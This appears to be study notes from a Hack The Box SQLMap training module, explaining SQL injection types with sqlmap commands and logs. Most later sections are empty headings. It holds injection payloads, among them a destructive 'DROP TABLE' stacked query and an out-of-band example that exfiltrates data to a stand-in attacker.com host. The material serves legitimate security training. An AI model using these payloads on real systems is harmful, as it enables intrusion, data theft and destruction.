---
tags:
  - HTB
  - MODULE
link: https://academy.hackthebox.com/app/module/58
description: The SQLMap Essentials module will teach you the basics of using SQLMap to discover various types of SQL Injection vulnerabilities, all the way to the advanced enumeration of databases to retrieve all data of interest.
---
## Summary

Most web applications these days are connected to a database at the backend that stores various types of data the web page needs to display, from user information to front end content.

It is very common for such web applications to improperly implement calls to the database, making it possible for an attacker to manipulate the HTTP requests sent to the server to trick the database into showing more data than the developers intended. This type of attack is called a SQL Injection (SQLi).

SQLMap is an automated tool specializing in automating SQL injection discovery and exploitation, making it very trivial for pentesters to discover and exploit SQL injection vulnerabilities.

In the `SQLMap Essentials` module, you will learn the basics of using SQLMap to discover various types of SQL injection vulnerabilities, all the way to advanced database enumeration and retrieval of interesting data.

In this module, we will cover:

- Overview and installation of SQLMap
- Different types of SQL Injection attacks supported by SQLMap, and where to use each
- Understanding the various output of SQLMap, to properly guide your attacks
- Attacking specific parts of a web application with the use of HTTP requests
- Dealing with various types of errors that we may be faced with when using SQLMap
- Using various SQLMap options to tune attacks to our specific needs
- Enumerating full databases and extracting the content of their tables, columns, and rows
- Advanced database enumeration to find specific data
- Finding usernames and passwords within databases and using SQLMap to crack them
- Bypassing various types of protections that may be in place to protect the web application against SQLMap
- Using SQLMap to read and write files to the remote server
- Using SQLMap to execute commands on the remote server and taking complete control over it

| SECTION/TASK | FLAG |
| ------------ | ---- |
|              |      |
|              |      |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Getting Started

### SQLMap Overview

[SQLMap](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.

```shell
adampueman@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:
as:

| Target connection          | Injection detection | Fingerprinting                                         |
| :------------------------- | :------------------ | :----------------------------------------------------- |
| Enumeration                | Optimization        | Protection detection and bypass using "tamper" scripts |
| Database content retrieval | File system access  | Execution of the operating system (OS) commands        |
<div align="center">
<br>
<br>
</div>

#### SQLMap Installation

SQLMap is pre-installed on your Pwnbox, and the majority of security-focused operating systems. SQLMap is also found on many Linux Distributions' libraries. For example, on Debian, it can be installed with:

```shell
adampueman@htb[/htb]$ sudo apt install sqlmap
```

If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:

```shell
`adampueman@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`
```

After that, SQLMap can be run with:

```shell
`adampueman@htb[/htb]$ python sqlmap.py`
```

<div align="center">
<br>
<br>
</div>

#### Supported Databases

SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

|  |  |  |  |
| --- | --- | --- | --- |
| MySQL | Oracle | PostgreSQL | Microsoft SQL Server |
| SQLite | IBM DB2 | Microsoft Access | Firebird |
| Sybase | SAP MaxDB | Informix | MariaDB |
| HSQLDB | CockroachDB | TiDB | MemSQL |
| H2 | MonetDB | Apache Derby | Amazon Redshift |
| Vertica, Mckoi | Presto | Altibase | MimerSQL |
| CrateDB | Greenplum | Drizzle | Apache Ignite |
| Cubrid | InterSystems Cache | IRIS | eXtremeDB |
| FrontBase |  |  |  |

The SQLMap team also works to add and support new DBMSes periodically.
<div align="center">
<br>
<br>
</div>

#### Supported SQL Injection Types

SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the `sqlmap -hh` command:

```shell
adampueman@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries
<div align="center">
<br>
<br>
</div>

#### Boolean-based blind SQL Injection

Example of `Boolean-based blind SQL Injection`:

```SQL
`AND 1=1`
```

SQLMap exploits `Boolean-based blind SQL Injection` vulnerabilities through the differentiation of `TRUE` from `FALSE` query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned `TRUE` or `FALSE`. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.

- `TRUE` results are generally based on responses having none or marginal difference to the regular server response.
- `FALSE` results are based on responses having substantial differences from the regular server response.
- `Boolean-based blind SQL Injection` is considered as the most common SQLi type in web applications.
<div align="center">
<br>
<br>
</div>

#### Error-based SQL Injection

Example of `Error-based SQL Injection`:

```SQL
AND GTID_SUBSET(@@version,0)`
```

If the `database management system` (`DBMS`) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers `Error-based SQL Injection` for the following DBMSes:

|                      |            |         |
| -------------------- | ---------- | ------- |
| MySQL                | PostgreSQL | Oracle  |
| Microsoft SQL Server | Sybase     | Vertica |
| IBM DB2              | Firebird   | MonetDB |

Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.
<div align="center">
<br>
<br>
</div>

#### UNION query-based

Example of `UNION query-based SQL Injection`:

```SQL
`UNION ALL SELECT 1,@@version,3`
```

With the usage of `UNION`, it is generally possible to extend the original (`vulnerable`) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.
<div align="center">
<br>
<br>
</div>

#### Stacked queries

Example of `Stacked Queries`:

```SQL
`; DROP TABLE users`
```

Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., `Microsoft SQL Server` and `PostgreSQL` support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.
<div align="center">
<br>
<br>
</div>

#### Time-based blind SQL Injection

Example of `Time-based blind SQL Injection`:

```SQL
`AND 1=IF(2>1,SLEEP(5),0)`
```

The principle of `Time-based blind SQL Injection` is similar to the `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation between `TRUE` or `FALSE`.

- `TRUE` response is generally characterized by the noticeable difference in the response time compared to the regular server response
- `FALSE` response should result in a response time indistinguishable from regular response times

`Time-based blind SQL Injection` is considerably slower than the boolean-based blind SQLi, since queries resulting in `TRUE` would delay the server response. This SQLi type is used in cases where `Boolean-based blind SQL Injection` is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. `INSERT`, `UPDATE` or `DELETE`), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as `Boolean-based blind SQL Injection` would not really work in this case.
<div align="center">
<br>
<br>
</div>

#### Inline queries

Example of `Inline Queries`:

```SQL
`SELECT (SELECT @@version) from`
```

This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.
<div align="center">
<br>
<br>
</div>

#### Out-of-band SQL Injection

Example of `Out-of-band SQL Injection`:

```SQL
`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
```

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the `foo` part, to form the entire SQL response.
<div>
<br>
<br>
</div>

#### Questions

##### What's the fastest SQLi type?
==Answer==
<div align="center">
<br>
<br>
</div>

### Getting Started with SQLMap

Upon starting using SQLMap, the first stop for new users is usually the program's help message. To help new users, there are two levels of help message listing:

- `Basic Listing` shows only the basic options and switches, sufficient in most cases (switch `-h`):

```shell
adampueman@htb[/htb]$ sqlmap -h
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs
...SNIP...
```

- `Advanced Listing` shows all options and switches (switch `-hh`):

```shell
adampueman@htb[/htb]$ sqlmap -hh
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    -A AGENT, --user..  HTTP User-Agent header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
...SNIP...
```

For more details, users are advised to consult the project's [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage), as it represents the official manual for SQLMap's usage.
<div align="center">
<br>
<br>
</div>

#### Basic Scenario

In a simple scenario, a penetration tester accesses the web page that accepts user input via a `GET` parameter (e.g., `id`). They then want to test if the web page is affected by the SQL injection vulnerability. If so, they would want to exploit it, retrieve as much information as possible from the back-end database, or even try to access the underlying file system and execute OS commands. An example SQLi vulnerable PHP code for this scenario would look as follows:

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

As error reporting is enabled for the vulnerable SQL query, there will be a database error returned as part of the web-server response in case of any SQL query execution problems. Such cases ease the process of SQLi detection, especially in case of manual parameter value tampering, as the resulting errors are easily recognized:

http://www.example.com/vuln.php?id=1

![Page with 'Lorem Ipsum' title, SQL error message, and explanation of Lorem Ipsum usage.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/58/rOrm8tC.png)

To run SQLMap against this example, located at the example URL `http://www.example.com/vuln.php?id=1`, would look like the following:

        shellsession
`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch         ___       __H__ ___ ___[']_____ ___ ___  {1.4.9} |_ -| . [,]     | .'| . | |___|_  [(]_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 22:26:45 /2020-09-09/ [22:26:45] [INFO] testing connection to the target URL [22:26:45] [INFO] testing if the target URL content is stable [22:26:46] [INFO] target URL content is stable [22:26:46] [INFO] testing if GET parameter 'id' is dynamic [22:26:46] [INFO] GET parameter 'id' appears to be dynamic [22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL') [22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks [22:26:46] [INFO] testing for SQL injection on GET parameter 'id' it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y [22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [22:26:46] [WARNING] reflective value(s) found and filtering out [22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther") [22:26:46] [INFO] testing 'Generic inline queries' [22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' [22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' ...SNIP... [22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable  [22:26:46] [INFO] testing 'MySQL inline queries' [22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)' [22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                        ...SNIP... [22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' [22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable  [22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test [22:26:56] [INFO] target URL appears to have 3 columns in query [22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests: --- Parameter: id (GET)     Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1 AND 8814=8814     Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)     Type: time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)     Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- - --- [22:26:56] [INFO] the back-end DBMS is MySQL web application technology: PHP 5.2.6, Apache 2.2.9 back-end DBMS: MySQL >= 5.0 [22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com' [*] ending @ 22:26:57 /2020-09-09/`

Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.
<div align="center">
<br>
<br>
</div>

### SQLMap Output Description
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Building Attacks

### SQLMap Overview
<div align="center">
<br>
<br>
</div>

### Getting Started with SQLMap
<div align="center">
<br>
<br>
</div>

### SQLMap Output Description
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Database Enumeration

### Database Enumeration
<div align="center">
<br>
<br>
</div>

### Advanced Database Enumeration
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Advanced SQLMap Usage

### Bypassing Web Application Protections
<div align="center">
<br>
<br>
</div>

### OS Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Skills Assessment
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

